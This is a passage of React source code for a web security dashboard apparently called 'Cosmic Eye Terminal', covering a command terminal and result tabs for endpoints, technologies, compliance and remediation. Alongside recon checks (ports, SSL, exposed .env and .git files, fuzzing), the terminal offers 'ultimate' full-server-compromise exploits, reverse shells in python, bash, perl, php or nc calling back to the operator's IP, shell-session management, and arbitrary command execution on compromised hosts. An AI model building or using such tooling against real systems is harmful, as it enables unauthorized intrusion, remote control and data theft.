                    if (data.missing?.length) { add('info', '── Missing ──'); data.missing.forEach(h => add('warn', `  ${h.name}: ${h.description}`)); }
                } else if (data.headers) {
                    Object.entries(data.headers).forEach(([k, v]) => add('output', `${k}: ${v}`));
                } else add('error', data.error || 'Failed');
            } else if (lc === 'scan-ssl') {
                add('info', `Analyzing SSL: ${safeDomain}...`);
                const res = await fetch(`/api/terminal/ssl?domain=${encodeURIComponent(safeDomain)}`, { headers: authHeaders });
                const data = await res.json();
                const s = data.ssl || data;
                if (s?.protocol) {
                    add('output', `Protocol: ${s.protocol} | Cipher: ${s.cipher}`);
                    add('output', `Issuer: ${s.issuer} | Subject: ${s.subject}`);
                    add('output', `Valid: ${s.validFrom} → ${s.validTo}`);
                    add('output', `Days until expiry: ${s.daysUntilExpiry}`);
                    add(s.expired ? 'error' : 'success', s.expired ? 'EXPIRED!' : 'Certificate Valid');
                    add(s.selfSigned ? 'warn' : 'success', s.selfSigned ? 'Self-signed certificate' : 'Trusted CA');
                    if (s.altNames?.length) add('output', `Alt Names: ${s.altNames.join(', ')}`);
                } else add('error', 'SSL check failed');
            } else if (lc === 'scan-ports' || lc === 'nmap') {
                add('info', `Scanning ports: ${safeDomain}...`);
                const res = await fetch(`/api/terminal/ports?host=${encodeURIComponent(safeDomain)}`, { headers: authHeaders });
                const data = await res.json();
                const ports = data.ports || data;
                if (Array.isArray(ports) && ports.length > 0) {
                    add('info', 'PORT      STATE   SERVICE');
                    ports.forEach(p => add('output', `${String(p.port).padEnd(10)}open    ${p.service}`));
                } else add('warn', 'No open ports found.');
            } else if (lc === 'check-robots') {
                add('info', 'Fetching robots.txt...');
                const res = await fetch(`/api/terminal/fetch?url=${encodeURIComponent(target + '/robots.txt')}`, { headers: authHeaders });
                const data = await res.json();
                if (data.body && data.status < 400) data.body.split('\n').slice(0, 50).forEach(l => add('output', l));
                else add('warn', 'Not found or empty');
            } else if (lc === 'check-env') {
                add('info', 'Checking .env...');
                const res = await fetch(`/api/terminal/fetch?url=${encodeURIComponent(target + '/.env')}`, { headers: authHeaders });
                const data = await res.json();
                if (data.status === 200 && data.body?.includes('=')) { add('error', '.env EXPOSED!'); data.body.split('\n').slice(0, 20).forEach(l => add('error', l)); }
                else add('success', '.env not accessible.');
            } else if (lc === 'check-git') {
                add('info', 'Checking .git...');
                const res = await fetch(`/api/terminal/fetch?url=${encodeURIComponent(target + '/.git/HEAD')}`, { headers: authHeaders });
                const data = await res.json();
                if (data.status === 200 && data.body && (data.body.includes('ref:') || /^[0-9a-f]{40}$/.test(data.body.trim()))) { add('error', '.git EXPOSED!'); add('error', data.body); }
                else add('success', '.git not accessible.');
            } else if (lc === 'dig') {
                add('info', `DNS: ${safeDomain}...`);
                const res = await fetch(`/api/terminal/dns?domain=${encodeURIComponent(safeDomain)}`, { headers: authHeaders });
                const data = await res.json();
                const records = data.records || data;
                if (Array.isArray(records) && records.length) records.forEach(r => add('output', `${(r.type || '').padEnd(8)} ${r.value}`));
                else add('error', 'DNS resolution failed');
            } else if (lc === 'endpoints') {
                const endpoints = await fetchTerminalEndpoints();
                if (!endpoints.length) { add('warn', 'No endpoints discovered yet.'); }
                else {
                    add('info', `=== ENDPOINTS (${endpoints.length}) ===`);
                    endpoints.slice(0, 300).forEach(ep => add('output', `${(ep.method || 'GET').padEnd(6)} ${ep.url}`));
                    if (endpoints.length > 300) add('warn', `Showing 300/${endpoints.length}`);
                }
            } else if (lc === 'subdomains') {
                add('info', 'Loading subdomains...');
                const res = await fetch(`/api/terminal/subdomains?scanId=${encodeURIComponent(sid)}`, { headers: authHeaders });
                const data = await res.json();
                const subs = data.subdomains || [];
                if (!subs.length) { add('warn', 'No subdomains discovered.'); }
                else { add('info', `═══ SUBDOMAINS (${subs.length}) ═══`); subs.forEach(s => add('output', `  ${s.subdomain} [${s.source}]`)); }
            } else if (lc === 'tech') {
                add('info', 'Loading technologies...');
                const res = await fetch(`/api/terminal/tech?scanId=${encodeURIComponent(sid)}`, { headers: authHeaders });
                const data = await res.json();
                const items = data.tech || [];
                if (!items.length) { add('warn', 'No technologies detected.'); }
                else { add('info', `═══ TECHNOLOGIES (${items.length}) ═══`); items.forEach(t => add('output', `  ${t.tech_name} ${t.tech_version || ''} [${t.tech_category}]`)); }
            } else if (lc === 'attack-surface') {
                add('system', '═══ LOADING ATTACK SURFACE ═══');
                const res = await fetch(`/api/terminal/attack-surface?scanId=${encodeURIComponent(sid)}`, { headers: authHeaders });
                const data = await res.json();
                if (data.error) { add('error', data.error); }
                else {
                    const s = data.summary || {};
                    addMulti([
                        { type: 'system', text: '' },
                        { type: 'info', text: '═══════════════════════════════════════════════════' },
                        { type: 'info', text: `  ATTACK SURFACE — ${data.domain}` },
                        { type: 'info', text: '═══════════════════════════════════════════════════' },
                        { type: 'system', text: '' },
                        { type: 'output', text: `  Subdomains:  ${data.subdomains}` },
                        { type: 'output', text: `  Live Hosts:  ${data.hosts}` },
                        { type: 'output', text: `  Endpoints:   ${data.endpoints}` },
                        { type: 'output', text: `  Risk Score:  ${data.riskScore}/100` },
                        { type: 'system', text: '' },
                    ]);
                    if ((data.openPorts || []).length > 0) {
                        add('info', '── OPEN PORTS ──');
                        data.openPorts.forEach(p => add('output', `  ${String(p.port).padEnd(8)} ${p.service || 'unknown'}`));
                        add('system', '');
                    }
                    if ((data.tech || []).length > 0) {
                        add('info', '── TECHNOLOGIES ──');
                        data.tech.forEach(t => add('output', `  ${t.tech_name} ${t.tech_version || ''} [${t.tech_category}]`));
                        add('system', '');
                    }
                    add('info', '── VULNERABILITY SUMMARY ──');
                    if (s.critical > 0) add('error', `  Critical: ${s.critical}`);
                    if (s.high > 0) add('error', `  High:     ${s.high}`);
                    if (s.medium > 0) add('warn', `  Medium:   ${s.medium}`);
                    if (s.low > 0) add('output', `  Low:      ${s.low}`);
                    add('output', `  Total:    ${s.total_vulns}`);
                    add('output', `  Confirmed Exploits: ${s.confirmed_exploits}`);
                    add('system', '');
                }
            } else if (lc.startsWith('curl ')) {
                const url = cmd.substring(5).trim();
                add('info', `GET ${url}...`);
                const res = await fetch(`/api/terminal/fetch?url=${encodeURIComponent(url)}`, { headers: authHeaders });
                const data = await res.json();
                add('output', `HTTP ${data.status}`);
                if (data.headers) Object.entries(data.headers).forEach(([k, v]) => add('output', `${k}: ${v}`));
                if (data.body) data.body.split('\n').slice(0, 100).forEach(l => add('output', l));
            } else if (lc === 'ultimate' || lc === 'exploit-ultimate') {
                add('system', '═══ ULTIMATE EXPLOIT ═══');
                add('info', 'Attempting full server compromise with reverse shell');
                const yourIp = prompt('Enter YOUR public IP for reverse shell callback:');
                if (!yourIp) { add('error', 'Cancelled — IP required'); setRunning(false); return; }
                const yourPort = prompt('Enter port (default 4444):') || '4444';
                add('info', `Target: ${target} | Callback: ${yourIp}:${yourPort}`);
                try {
                    const res = await fetch(`/api/terminal/exploit-full`, {
                        method: 'POST', headers: { ...authHeaders, 'Content-Type': 'application/json' },
                        body: JSON.stringify({ scanId: sid, targetUrl: target, yourIp, yourPort: parseInt(yourPort), autoShell: true })
                    });
                    const data = await res.json();
                    if (data.terminalOutput) {
                        data.terminalOutput.forEach(line => {
                            const text = typeof line === 'string' ? line : String(line);
                            const isShell = text.includes('SHELL') || text.includes('COMPROMISED') || text.includes('CONFIRMED');
                            const isErr = text.includes('[-]') || text.includes('FAILED');
                            add(isShell ? 'error' : isErr ? 'warn' : 'output', text);
                        });
                    }
                    if (data.shellConnected) {
                        add('error', '╔══════════════════════════════════════════════════╗');
                        add('error', '║  SERVER COMPROMISED - SHELL ACTIVE              ║');
                        add('error', '╚══════════════════════════════════════════════════╝');
                    }
                } catch (err) { add('error', `Exploit failed: ${err.message}`); }
            } else if (lc === 'ultimate-auto') {
                add('system', '═══ AUTO-EXPLOIT ═══');
                const yourIp = prompt('Enter YOUR public IP:');
                if (!yourIp) { add('error', 'Cancelled'); setRunning(false); return; }
                try {
                    const res = await fetch(`/api/exploit/reverse-shell`, {
                        method: 'POST', headers: { ...authHeaders, 'Content-Type': 'application/json' },
                        body: JSON.stringify({ scanId: sid, targetUrl: target, yourIp, verifyOnly: false })
                    });
                    const data = await res.json();
                    add(data.connected ? 'error' : 'warn', data.connected ? `Reverse shell established! Session: ${data.sessionId}` : 'Shell not connected.');
                } catch (err) { add('error', `Auto-exploit failed: ${err.message}`); }
            } else if (lc === 'reverse-shell' || lc === 'shell') {
                add('system', '═══ REVERSE SHELL ═══');
                const yourIp = prompt('Enter YOUR public IP:');
                if (!yourIp) { add('error', 'Cancelled'); setRunning(false); return; }
                const yourPort = prompt('Enter port (default 4444):') || '4444';
                const payloadType = prompt('Payload type (python/bash/perl/php/nc):') || 'python';
                add('info', `Initiating ${payloadType} reverse shell to ${yourIp}:${yourPort}...`);
                try {
                    const res = await fetch(`/api/exploit/reverse-shell`, {
                        method: 'POST', headers: { ...authHeaders, 'Content-Type': 'application/json' },
                        body: JSON.stringify({ scanId: sid, targetUrl: target, yourIp, yourPort: parseInt(yourPort), payloadType })
                    });
                    const data = await res.json();
                    if (data.sessionId) {
                        add('error', `Reverse shell initiated! Session: ${data.sessionId}`);
                        add('info', `Status: ${data.status}`);
                    } else { add('error', `Failed: ${data.error || 'Unknown error'}`); }
                } catch (err) { add('error', `Reverse shell failed: ${err.message}`); }
            } else if (lc === 'shell-sessions') {
                try {
                    const res = await fetch(`/api/exploit/shell-sessions/${sid}`, { headers: authHeaders });
                    const data = await res.json();
                    const sessions = data.sessions || [];
                    if (!sessions.length) { add('warn', 'No shell sessions.'); }
                    else { sessions.forEach(s => add(s.status === 'active' ? 'error' : 'info', `  Session ${s.id}: ${s.status} | ${s.payload_type || 'unknown'}`)); }
                } catch (err) { add('error', `Failed: ${err.message}`); }
            } else if (lc === 'active-sessions') {
                try {
                    const res = await fetch(`/api/exploit/active-sessions`, { headers: authHeaders });
                    const data = await res.json();
                    const sessions = data.activeSessions || [];
                    if (!sessions.length) { add('warn', 'No active sessions.'); }
                    else { sessions.forEach(s => add('error', `  ${s.targetUrl} | ${s.status}`)); }
                } catch (err) { add('error', `Failed: ${err.message}`); }
            } else if (lc.startsWith('stop-shell ')) {
                const sessionId = cmd.substring(11).trim();
                try {
                    const res = await fetch(`/api/exploit/stop-listener`, {
                        method: 'POST', headers: { ...authHeaders, 'Content-Type': 'application/json' },
                        body: JSON.stringify({ sessionId: parseInt(sessionId) })
                    });
                    const data = await res.json();
                    add(data.success ? 'success' : 'error', data.message || (data.success ? 'Stopped' : 'Failed'));
                } catch (err) { add('error', `Failed: ${err.message}`); }
            } else if (lc === 'whoami' || lc === 'id' || lc === 'pwd') {
                await executeShellCommand(lc);
            } else if (lc.startsWith('ls')) {
                await executeShellCommand(`ls -la ${cmd.substring(2).trim() || '.'}`);
            } else if (lc.startsWith('cat ')) {
                const file = cmd.substring(4).trim();
                if (!file) { add('error', 'Usage: cat <filename>'); setRunning(false); return; }
                await executeShellCommand(`cat ${file}`);
            } else if (lc.startsWith('exec ')) {
                const command = cmd.substring(5).trim();
                if (!command) { add('error', 'Usage: exec <command>'); setRunning(false); return; }
                await executeShellCommand(command);
            } else if (lc.startsWith('exploit ') || lc === 'exploit') {
                const vulnId = cmd.substring(7).trim();
                if (!vulnId) { add('error', 'Usage: exploit <id>'); setRunning(false); return; }
                add('system', `═══ EXPLOIT VERIFICATION: ${vulnId} ═══`);
                try {
                    const res = await fetch(`/api/terminal/exploit-full`, {
                        method: 'POST', headers: { ...authHeaders, 'Content-Type': 'application/json' },
                        body: JSON.stringify({ scanId: sid, vulnId })
                    });
                    const data = await res.json();
                    if (data.terminalOutput) {
                        data.terminalOutput.forEach(line => {
                            const text = typeof line === 'string' ? line : String(line);
                            const isCrit = text.includes('VERIFIED') || text.includes('CONFIRMED') || text.includes('EXPLOIT EVIDENCE');
                            const isWarn = text.includes('ATTEMPTED') || text.includes('NOT CONFIRMED');
                            add(isCrit ? 'error' : isWarn ? 'warn' : 'output', text);
                        });
                    } else if (data.error) { add('error', data.error); }
                    else { add(data.verified ? 'error' : 'warn', data.verified ? 'EXPLOIT VERIFIED!' : 'Not confirmed'); }
                } catch (err) { add('error', `Exploit failed: ${err.message}`); }
            } else if (lc === 'fuzz') {
                add('info', `Fuzzing ${target}... This may take 30-60 seconds.`);
                const res = await fetch(`/api/terminal/fuzz`, {
                    method: 'POST', headers: { ...authHeaders, 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: target })
                });
                const data = await res.json();
                if (data.error) { add('error', `Fuzz failed: ${data.error}`); }
                else {
                    add('info', `Fuzzed ${data.tested || 0} combinations (${data.params?.length || 0} params × ${data.payloadCount || 0} payloads)`);
                    const hits = data.hits || [];
                    if (hits.length) {
                        add('error', `${hits.length} HITS FOUND:`);
                        hits.forEach(h => add('error', `  ${h.type} via "${h.param}" — ${h.payload}`));
                    } else { add('success', 'No vulnerabilities found via fuzzing.'); }
                }
            } else if (lc === 'status') {
                const statusData = await fetchTerminalStatus();
                const list = await fetchTerminalVulns();
                add('info', '=== SCAN STATUS ===');
                add('output', `Domain: ${safeDomain}`);
                add('output', `State: ${statusData.scan?.status || 'unknown'}`);
                add('output', `Endpoints: ${statusData.stats?.endpoints || 0}`);
                add('output', `Vulnerabilities: ${statusData.stats?.vulnerabilities || 0}`);
                add('output', `Exploit checks: ${statusData.stats?.exploitChecks || 0}`);
                const cr = list.filter(v => v.severity === 'critical').length;
                const hi = list.filter(v => v.severity === 'high').length;
                const me = list.filter(v => v.severity === 'medium').length;
                const lo = list.filter(v => v.severity === 'low').length;
                if (cr > 0) add('error', `  Critical: ${cr}`);
                if (hi > 0) add('error', `  High: ${hi}`);
                if (me > 0) add('warn', `  Medium: ${me}`);
                if (lo > 0) add('output', `  Low: ${lo}`);
            } else {
                add('error', `Unknown: "${cmd}". Type "help" for commands.`);
            }
        } catch (err) { add('error', `Error: ${err.message}`); }
        setRunning(false);
    };

    const runCmd = (cmd) => {
        if (running) return;
        add('prompt', `bf@${safeDomain}> ${cmd}`);
        setCmdHistory(h => [cmd, ...h.filter(c => c !== cmd)].slice(0, 50));
        setHistIdx(-1);
        setInput('');
        const lower = cmd.toLowerCase();
        if (commands[lower]) {
            Promise.resolve(commands[lower]()).catch(err => add('error', `Error: ${err.message}`));
        } else runAsync(cmd);
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        if (!input.trim() || running) return;
        runCmd(input.trim());
    };

    const handleKeyDown = (e) => {
        if (e.key === 'ArrowUp') {
            e.preventDefault();
            const next = Math.min(histIdx + 1, cmdHistory.length - 1);
            if (cmdHistory[next]) { setHistIdx(next); setInput(cmdHistory[next]); }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            const next = histIdx - 1;
            if (next < 0) { setHistIdx(-1); setInput(''); }
            else { setHistIdx(next); setInput(cmdHistory[next]); }
        } else if (e.key === 'Tab') {
            e.preventDefault();
            const partial = input.toLowerCase();
            if (partial) {
                const allCmds = ['ultimate','ultimate-auto','reverse-shell','shell-sessions','active-sessions','stop-shell','whoami','id','pwd','ls','cat','exec','scan','fuzz','exploit','scan-headers','scan-ssl','scan-ports','check-robots','check-env','check-git','dig','curl','vulns','endpoints','subdomains','tech','attack-surface','status','clear','help'];
                const match = allCmds.find(c => c.startsWith(partial));
                if (match) setInput(match);
            }
        }
    };

    const quickCmds = [
        { label: 'Scan', cmd: 'scan' },
        { label: 'Fuzz', cmd: 'fuzz' },
        { label: 'Vulns', cmd: 'vulns' },
        { label: 'Endpoints', cmd: 'endpoints' },
        { label: 'Surface', cmd: 'attack-surface' },
        { label: 'Ports', cmd: 'scan-ports' },
        { label: 'SSL', cmd: 'scan-ssl' },
        { label: 'Headers', cmd: 'scan-headers' },
        { label: 'DNS', cmd: 'dig' },
        { label: 'Tech', cmd: 'tech' },
        { label: 'Status', cmd: 'status' },
    ];

    return (
        <div className="term-container">
            <div className="term-chrome">
                <div className="term-dots"><i className="td r" /><i className="td y" /><i className="td g" /></div>
                <span className="term-title">{`COSMIC EYE TERMINAL — ${safeDomain}`}</span>
                <div className="term-badge">SCAN</div>
            </div>
            <div className="term-quick">
                {quickCmds.map(q => (
                    <button key={q.cmd} className="tq-btn" onClick={() => runCmd(q.cmd)} disabled={running}>{q.label}</button>
                ))}
            </div>
            <div className="term-body" ref={bodyRef} onClick={() => inputRef.current?.focus()}>
                {history.map((line, i) => <div key={i} className={`tl tl-${line.type}`}>{line.text}</div>)}
                {running && <div className="tl tl-info tl-loading"><span className="loading-dots">⏳ Executing</span></div>}
            </div>
            <form className="term-input-bar" onSubmit={handleSubmit}>
                <span className="term-ps1">{`bf@${safeDomain}>`}</span>
                <input ref={inputRef} type="text" value={input} onChange={e => setInput(e.target.value)} onKeyDown={handleKeyDown}
                    className="term-input" placeholder="Enter command... (Tab to autocomplete)" autoFocus disabled={running} />
                <button type="submit" className="term-send" disabled={running || !input.trim()}>▶</button>
            </form>
        </div>
    );
}

/* ═══════════════════════════════════════════════ */
/* ENDPOINTS                                       */
/* ═══════════════════════════════════════════════ */
function EndpointsTab({ data, search, setSearch }) {
    const [filter, setFilter] = useState('all');
    if (!data) return <Loader />;
    const filtered = data.filter(e => String(e.url || '').toLowerCase().includes(search.toLowerCase()) && (filter === 'all' || e.method === filter));
    const mc = { GET: '#3b82f6', POST: '#00e676', PUT: '#ff8c00', DELETE: '#ff3e3e' };
    return (
        <div className="w-section">
            <SearchBar value={search} onChange={setSearch} placeholder="Search endpoints..." count={filtered.length} total={data.length} />
            <div className="w-pills">
                {['all', 'GET', 'POST', 'PUT', 'DELETE'].map(f => <button key={f} className={`w-pill ${filter === f ? 'active' : ''}`} onClick={() => setFilter(f)}>{f}</button>)}
            </div>
            <div className="w-table-wrap">
                <table className="w-table">
                    <thead><tr><th>Method</th><th>URL</th><th>Params</th><th>Source</th></tr></thead>
                    <tbody>
                        {filtered.slice(0, 300).map((e, i) => {
                            let params = []; try { params = JSON.parse(e.parameters || '[]'); } catch { /* empty */ }
                            return (
                                <tr key={e.id || i}>
                                    <td><span className="method-badge" style={{ background: mc[e.method] || '#666' }}>{e.method}</span></td>
                                    <td className="mono break">{e.url}</td>
                                    <td>{params.length > 0 ? params.join(', ') : '—'}</td>
                                    <td className="dim">{e.source}</td>
                                </tr>
                            );
                        })}
                    </tbody>
                </table>
                {filtered.length > 300 && <p className="truncated">Showing 300 of {filtered.length}</p>}
            </div>
        </div>
    );
}

/* ═══════════════════════════════════════════════ */
/* TECH STACK                                      */
/* ═══════════════════════════════════════════════ */
function TechTab({ data, search, setSearch }) {
    if (!data) return <Loader />;
    const filtered = data.filter(t => String(t.tech_name || '').toLowerCase().includes(search.toLowerCase()));
    return (
        <div className="w-section">
            <SearchBar value={search} onChange={setSearch} placeholder="Search technologies..." count={filtered.length} total={data.length} />
            <div className="tech-grid">
                {filtered.map(t => (
                    <div key={t.id} className="tech-card">
                        <div className="tech-icon">⚙️</div>
                        <div className="tech-name">{t.tech_name}</div>
                        {t.tech_version && <div className="tech-version">v{t.tech_version}</div>}
                        <div className="tech-category">{t.tech_category}</div>
                    </div>
                ))}
            </div>
        </div>
    );
}

/* ═══════════════════════════════════════════════ */
/* COMPLIANCE                                      */
/* ═══════════════════════════════════════════════ */
function ComplianceTab({ data }) {
    const [framework, setFramework] = useState('all');
    if (!data) return <Loader />;
    const frameworks = ['all', ...new Set(data.map(c => c.framework))];
    const filtered = framework === 'all' ? data : data.filter(c => c.framework === framework);
    const pass = filtered.filter(c => c.status === 'pass').length;
    const fail = filtered.filter(c => c.status === 'fail').length;
    const warn = filtered.filter(c => c.status === 'warning').length;
    return (
        <div className="w-section">
            <div className="w-pills">
                {frameworks.map(f => <button key={f} className={`w-pill ${framework === f ? 'active' : ''}`} onClick={() => setFramework(f)}>{f === 'all' ? 'ALL' : f}</button>)}
            </div>
            <div className="comp-stats">
                <div className="comp-stat pass">✓ {pass} Pass</div>
                <div className="comp-stat warn">⚠ {warn} Warning</div>
                <div className="comp-stat fail">✕ {fail} Fail</div>
            </div>
            <div className="w-table-wrap">
                <table className="w-table">
                    <thead><tr><th>Framework</th><th>Category</th><th>Check</th><th>Status</th><th>Details</th></tr></thead>
                    <tbody>
                        {filtered.map((c, i) => (
                            <tr key={c.id || i} className={`cr cr-${c.status}`}>
                                <td><strong>{c.framework}</strong></td>
                                <td>{c.category}</td>
                                <td>{c.check_name}</td>
                                <td><span className={`status-badge sb-${c.status}`}>{c.status}</span></td>
                                <td className="dim">{c.details}</td>
                            </tr>
                        ))}
                    </tbody>
                </table>
            </div>
        </div>
    );
}

/* ═══════════════════════════════════════════════ */
/* TIMELINE                                        */
/* ═══════════════════════════════════════════════ */
function TimelineTab({ data }) {
    if (!data) return <Loader />;
    return (
        <div className="w-section">
            <div className="timeline-wrapper">
                {data.map((ev, i) => (
                    <div key={ev.id || i} className="tl-event">
                        <div className="tl-marker" />
                        <div className="tl-card">
                            <div className="tl-time">{new Date(ev.timestamp).toLocaleString()}</div>
                            <div className="tl-event-type">{ev.event_type}</div>
                            <div className="tl-event-desc">{ev.description}</div>
                        </div>
                    </div>
                ))}
                {data.length === 0 && <Empty text="No timeline events" />}
            </div>
        </div>
    );
}

/* ═══════════════════════════════════════════════ */
/* REMEDIATION                                     */
/* ═══════════════════════════════════════════════ */
function RemediationTab({ data }) {
    if (!data) return <Loader />;
    return (
        <div className="w-section">
            <div className="rem-list">
                {data.map(r => {
                    const color = SEV_COLORS[r.severity] || '#666';
                    return (
                        <div key={r.id} className="rem-card" style={{ '--sev-color': color }}>
                            <div className="rem-header">
                                <div>
                                    <span className="rem-title">{r.title}</span>
                                    <span className="rem-sev" style={{ color }}>{r.severity?.toUpperCase()}</span>
                                </div>
                                <div className="rem-meta">Priority {r.priority} | Effort: {r.effort}</div>
                            </div>
                            <p className="rem-desc">{r.description}</p>
                            <div className="rem-fix-block">
                                <h5>🔧 Fix</h5>
                                <pre className="rem-code">{r.fix}</pre>
                            </div>
                        </div>
                    );
                })}
                {data.length === 0 && <Empty text="No remediation items" />}
            </div>
        </div>
    );
}

/* ═══════════════════════════════════════════════ */
/* DATA TABLE (generic)                            */
/* ═══════════════════════════════════════════════ */
function DataTable({ data, search, setSearch, cols, title }) {
    if (!data) return <Loader />;
    const filtered = data.filter(row => cols.some(c => String(row[c] || '').toLowerCase().includes(search.toLowerCase())));
    return (
        <div className="w-section">
            <SearchBar value={search} onChange={setSearch} placeholder={`Search ${title}...`} count={filtered.length} total={data.length} />
            <div className="w-table-wrap">
                <table className="w-table">
                    <thead><tr>{cols.map(c => <th key={c}>{c.replace(/_/g, ' ')}</th>)}</tr></thead>
                    <tbody>
                        {filtered.slice(0, 500).map((row, i) => (
                            <tr key={row.id || i}>{cols.map(c => <td key={c} className="mono break">{String(row[c] ?? '—')}</td>)}</tr>
                        ))}
                    </tbody>
                </table>
                {filtered.length > 500 && <p className="truncated">Showing 500 of {filtered.length}</p>}
            </div>
        </div>
    );
}

/* ═══════════════════════════════════════════════ */
/* SHARED COMPONENTS                               */
/* ═══════════════════════════════════════════════ */
function SearchBar({ value, onChange, placeholder, count, total }) {
    return (
        <div className="w-search">
            <svg className="w-search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="11" cy="11" r="8" /><path d="m21 21-4.35-4.35" />
            </svg>
            <input type="text" value={value} onChange={e => onChange(e.target.value)} placeholder={placeholder} className="w-search-input" />
            {value && <span className="w-search-count">{count}/{total}</span>}
        </div>
    );
}

function DataRow({ label, value }) {
    return <div className="er-row"><span className="er-label">{label}</span><span className="er-value">{value}</span></div>;
}

function Loader() {
    return (
        <div className="weapon-loading sm">
            <div className="weapon-logo-pulse sm">
                <div className="pulse-ring" /><div className="pulse-core sm">CE</div>
            </div>
            <p className="loading-text">Scanning universe...</p>
        </div>
    );
}

function Empty({ text }) {
    return <div className="w-empty">{text}</div>;
}
